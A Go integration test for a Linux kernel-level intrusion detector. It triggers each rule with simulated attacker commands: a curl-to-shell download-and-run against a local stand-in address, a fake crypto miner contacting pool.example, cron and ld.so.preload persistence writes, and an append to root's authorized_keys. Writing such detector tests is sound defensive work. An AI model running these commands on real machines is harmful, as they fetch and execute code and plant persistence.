//go:build linux

package live

import (
	"context"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"testing"
	"time"
)

// A copy of the test binary named like a service becomes a shell in place,
// so the shell starts under that service's name without needing bash.
func init() {
	if command := os.Getenv("DEACONGUARD_LIVE_TEST_EXEC"); command != "" {
		os.Unsetenv("DEACONGUARD_LIVE_TEST_EXEC")
		syscall.Exec("/bin/sh", []string{"sh", "-c", command}, os.Environ())
		os.Exit(1)
	}
}

// TestKernel loads the watchers into the running kernel and triggers each
// rule. It needs root and a kernel that can run them, so it runs only with
// DEACONGUARD_LIVE_TEST=1, in a throwaway machine or privileged container
// sharing the machine's process namespace.
func TestKernel(t *testing.T) {
	if os.Getenv("DEACONGUARD_LIVE_TEST") != "1" {
		t.Skip("set DEACONGUARD_LIVE_TEST=1 to load the watchers into this kernel")
	}
	detector := NewDetector(os.Getenv("DEACONGUARD_HOST_ROOT"), t.Logf)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go detector.Run(ctx)
	deadline := time.Now().Add(10 * time.Second)
	for {
		status, _ := detector.Take()
		if status.State == StateActive {
			break
		}
		if status.State == StateUnsupported || status.State == StateStopped || time.Now().After(deadline) {
			t.Fatalf("detection didn't start: %+v", status)
		}
		time.Sleep(100 * time.Millisecond)
	}
	// The commands below are this test's children, which the rules take
	// for the agent's own unless it goes by another name meanwhile.
	agent := agentName
	agentName = "not-the-agent"
	run := func(script string) {
		if output, err := exec.Command("sh", "-c", script).CombinedOutput(); err != nil {
			t.Logf("%s: %v %s", script, err, output)
		}
	}
	run("cp /bin/true /tmp/dropper && /tmp/dropper && rm -f /tmp/dropper")
	self, _ := os.Executable()
	run("cp " + self + " /tmp/nginx && DEACONGUARD_LIVE_TEST_EXEC='id >/dev/null' /tmp/nginx; rm -f /tmp/nginx")
	run("cp /bin/true /usr/local/bin/xmrig && xmrig --url stratum+tcp://pool.example:3333; rm -f /usr/local/bin/xmrig")
	run("setsid sh -c 'curl -fsS http://127.0.0.1:1/x | sh' </dev/null >/dev/null 2>&1")
	run("echo '* * * * * root true' > /etc/cron.d/dgtest && rm -f /etc/cron.d/dgtest")
	run("cd /etc && touch ld.so.preload && rm -f ld.so.preload")
	run("mkdir -p /root/.ssh && echo key >> /root/.ssh/authorized_keys")
	run("echo hello > /etc/hostname.dgtest; rm -f /etc/hostname.dgtest")
	time.Sleep(time.Second)
	agentName = agent
	detector.AskTest()
	time.Sleep(3 * time.Second)
	status, alerts := detector.Take()
	found := map[string]Alert{}
	for _, alert := range alerts {
		t.Logf("%s %s %s | %s | %s", alert.Rule, alert.Severity, alert.Title, alert.Program, alert.Command)
		key := alert.Rule
		if alert.Test {
			key = "test"
		}
		found[key] = alert
	}
	for _, rule := range []string{RuleTempProgram, RuleServiceShell, RuleMiner, RuleDownloadRun, RulePersistence, RuleSSHLogins, "test"} {
		if _, ok := found[rule]; !ok {
			t.Errorf("no %s alert", rule)
		}
	}
	for _, alert := range alerts {
		if strings.Contains(alert.Path, "hostname") {
			t.Errorf("unwatched file reported: %+v", alert)
		}
	}
	t.Logf("status: %+v", status)
	if status.EventsLastHour == 0 || status.Lost != 0 {
		t.Errorf("counters: %+v", status)
	}
}
